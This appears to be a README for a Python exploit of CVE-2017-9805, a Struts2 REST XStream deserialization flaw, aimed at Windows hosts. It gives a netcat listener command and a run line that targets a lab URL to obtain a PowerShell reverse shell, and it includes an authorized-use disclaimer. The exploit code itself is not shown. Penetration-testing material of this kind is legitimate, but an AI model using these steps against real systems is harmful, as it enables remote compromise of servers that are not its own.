# struts2_rest_xstream - CVE-2017-9805

**Advisory**

All the binaries/scripts/code of struts2_rest_xstream should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
* * *

For information regarding this exploit please see https://nvd.nist.gov/vuln/detail/CVE-2017-9805

In a nutshell, this is a deserialization exploit where you can obtain RCE.

I developed this particular script to avoid using the metasploit version https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream for Windows as I had some issues with that version.

There seems to be plenty of Linux versions floating around GitHub but I have not seen any Windows versions. It's probably very rare you would use it, but good to know the option is there.

**Usage**

Set up your listener:

```
nc -nlvp 9001
```

Then execute the script:

```
python struts2_rest_xstream.py -l 10.10.14.12 -p 9001 -u http://10.10.10.120:8080/struts2-rest-showcase/orders/3
```

If it successfully worked then it should connect back to your listener.

The script attempts to execute a PowerShell reverse shell. Easily modified to suit your needs.
